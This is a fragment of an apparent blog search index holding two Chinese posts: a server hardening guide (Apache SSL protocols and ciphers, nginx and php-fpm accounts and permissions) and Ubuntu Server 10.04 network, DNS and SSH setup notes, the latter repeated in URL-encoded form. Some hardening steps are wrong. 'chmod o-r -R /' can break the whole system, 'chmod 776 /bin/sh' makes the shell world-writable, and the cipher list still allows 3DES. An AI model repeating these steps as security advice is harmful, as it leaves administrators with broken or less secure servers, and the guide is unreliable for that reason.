版本更新： 及时更新OpenSSL版本避免旧版本中的高危漏洞的出现。 配置修改： 修改/etc/httpd/conf.d/ssl.conf配置： 1.将SSLProtocol 设置为SSLProtocol all -SSLv2 -SSLv3 2.添加SSLHonorCipherOrder on 3.将SSLCipherSuite 设置为：ECDH+AESGCM:DH+AESGCM:ECDH+AES256:DH+AES256:ECDH+AES128:DH+AES:ECDH+3DES:DH+3DES:RSA+AESGCM:RSA+AES:RSA+3DES:!aNULL:!MD5 功能关闭： 在 /etc/sysconfig/httpd 关闭 SSLCompression 添加该语句export OPENSSL_NO_DEFAULT_ZLIB=1即可 Ngnix： 权限配置 1.修改网站目录运行账户 修改所有者为非php-fpm运行账户，可修改所有者为root。 命令： chown -R root:root html/ 2.修改nginx及php-fpm的运行账户及组为nobody 修改nginx.conf 中user 为nobody 修改Php-fpm.conf 中user与group 为nobody 3.修改nobody权限（可选） 取消nobody对所有目录的的读取权限，然后添加对网站目录的读取权限 1.chmod o-r –R / 2.chmod o+r –R html/ 4.修改执行权限（可选） 取消nobody对于/bin/sh 的执行权限 chmod 776 /bin/sh(需要确认网站目录对于nobody的权限为可读可执行，对网站文件的权限为可读) 5.对于上传目录或者写入写文件的目录添加nobody的写入权限 （可选） 6.配置nginx.conf 对于上传目录无php的执行权限 7.配置nginx.conf禁止访问的文件夹，如后台，或者限制访问ip（可选） 8.配置nginx.conf禁止访问的文件类型，如一些txt日志文件（可选） ","link":"https://brick713.github.io/fu-wu-qi-an-quan-pei-zhi-zhi-nan/"},{"title":"Ubuntu Server 配置指南","content":"Ubuntu Server 配置小记 Ubuntu用了很久了每次要配置的时候就经常要上网查看各种信息，不仅麻烦还有N多的不靠谱，现在自己写一个方便以后自己使用。这里必须强调的是使用的版本是 Ubuntu Server 10.04 后面12.04的版本和这边笔记里面还是有不同的，这里一定要注意！ 网卡配置 编辑文件 vim /etc/network/interfaces 增加内容 auto eth0 iface eth0 inet static address xx.xx.xx.xx netmask 255.255.255.0 gateway xx.xx.xx.xx 上面的配置视实际情况而定，配置完后还需要进一步配置DNS服务器。 DNS配置 需要编辑文件 vim /etc/resolv.conf 添加内容： nameserver 8.8.8.8 nameserver 114.114.114.114 当然你也可以使用别的公共DNS比如阿里的223.5.5.5 然后重启 /etc/init.d/networking restart SSH配置 Ubuntu Server 默认安装了OpenSSH-clinet，但是不默认安装OpenSSH Server，需要自行安装，命令为： apt-get install openssh-server 然后Ubuntu会自动下载并安装。 安装完毕之后需要重启SSH Server服务 /etc/init.d/ssh restart 然后就可以使用类似Xshell，SecureCRT等软件进行SSH连接，提高效率了。 基本上到这里，Ubuntu Server的基本网络配置就完成了，剩下的即使按照需求安装各类软件了。以后还有增加，将会继续完善配置。%23Ubuntu%20Server%20%u914D%u7F6E%u5C0F%u8BB0%0AUbuntu%u7528%u4E86%u5F88%u4E45%u4E86%u6BCF%u6B21%u8981%u914D%u7F6E%u7684%u65F6%u5019%u5C31%u7ECF%u5E38%u8981%u4E0A%u7F51%u67E5%u770B%u5404%u79CD%u4FE1%u606F%uFF0C%u4E0D%u4EC5%u9EBB%u70E6%u8FD8%u6709N%u591A%u7684%u4E0D%u9760%u8C31%uFF0C%u73B0%u5728%u81EA%u5DF1%u5199%u4E00%u4E2A%u65B9%u4FBF%u4EE5%u540E%u81EA%u5DF1%u4F7F%u7528%u3002%u8FD9%u91CC%u5FC5%u987B%u5F3A%u8C03%u7684%u662F%u4F7F%u7528%u7684%u7248%u672C%u662F%0A%3EUbuntu%20Server%2010.04%0A%0A%u540E%u976212.04%u7684%u7248%u672C%u548C%u8FD9%u8FB9%u7B14%u8BB0%u91CC%u9762%u8FD8%u662F%u6709%u4E0D%u540C%u7684%uFF0C%u8FD9%u91CC%u4E00%u5B9A%u8981%u6CE8%u610F%uFF01%0A%23%23%u7F51%u5361%u914D%u7F6E%0A%u7F16%u8F91%u6587%u4EF6%0A%3Evim%20/etc/network/interfaces%0A%0A%u589E%u52A0%u5185%u5BB9%0A%3Eauto%20eth0%0Aiface%20eth0%20inet%20static%0Aaddress%20xx.xx.xx.xx%0Anetmask%20255.255.255.0%0Agateway%20xx.xx.xx.xx%0A%0A%u4E0A%u9762%u7684%u914D%u7F6E%u89C6%u5B9E%u9645%u60C5%u51B5%u800C%u5B9A%uFF0C%u914D%u7F6E%u5B8C%u540E%u8FD8%u9700%u8981%u8FDB%u4E00%u6B65%u914D%u7F6EDNS%u670D%u52A1%u5668%u3002%0A%0A%23%23DNS%u914D%u7F6E%0A%0A%u9700%u8981%u7F16%u8F91%u6587%u4EF6%0A%3Evim%20/etc/resolv.conf%0A%0A%u6DFB%u52A0%u5185%u5BB9%uFF1A%0A%0A%3Enameserver%208.8.8.8%0Anameserver%20114.114.114.114%0A%0A%u5F53%u7136%u4F60%u4E5F%u53EF%u4EE5%u4F7F%u7528%u522B%u7684%u516C%u5171DNS%u6BD4%u5982%u963F%u91CC%u7684223.5.5.5%0A%0A%u7136%u540E%u91CD%u542F%0A%0A%3E/etc/init.d/networking%20restart%0A%0A%23%23SSH%u914D%u7F6E%0A%0AUbuntu%20Server%20%u9ED8%u8BA4%u5B89%u88C5%u4E86OpenSSH-clinet%uFF0C%u4F46%u662F%u4E0D%u9ED8%u8BA4%u5B89%u88C5OpenSSH%20Server%uFF0C%u9700%u8981%u81EA%u884C%u5B89%u88C5%uFF0C%u547D%u4EE4%u4E3A%uFF1A%0A%0A%3Eapt-get%20install%20openssh-server%0A%0A%u7136%u540EUbuntu%u4F1A%u81EA%u52A8%u4E0B%u8F7D%u5E76%u5B89%u88C5%u3002%0A%0A%u5B89%u88C5%u5B8C%u6BD5%u4E4B%u540E%u9700%u8981%u91CD%u542FSSH%20Server%u670D%u52A1%0A%0A%3E/etc/init.d/ssh%20restart%20%0A%0A%u7136%u540E%u5C31%u53EF%u4EE5%u4F7F%u7528%u7C7B%u4F3CXshell%uFF0CSecureCRT%u7B49%u8F6F%u4EF6%u8FDB%u884CSSH%u8FDE%u63A5%uFF0C%u63D0%u9AD8%u6548%u7387%u4E86%u3002%0A%0A%u57FA%u672C%u4E0A%u5230%u8FD9%u91CC%uFF0CUbuntu%20Server%u7684%u57FA%u672C%u7F51%u7EDC%u914D%u7F6E%u5C31%u5B8C%u6210%u4E86%uFF0C%u5269%u4E0B%u7684%u5373%u4F7F%u6309%u7167%u9700%u6C42%u5B89%u88C5%u5404%u7C7B%u8F6F%u4EF6%u4E86%u3002%u4EE5%u540E%u8FD8%u6709%u589E%u52A0%uFF0C%u5C06%u4F1A%u7EE7%u7EED%u5B8C%u5584%u914D%u7F6E%u3002 ","link":"https://brick713.github.io/ubuntu-server-pei-zhi-zhi-nan/"}]}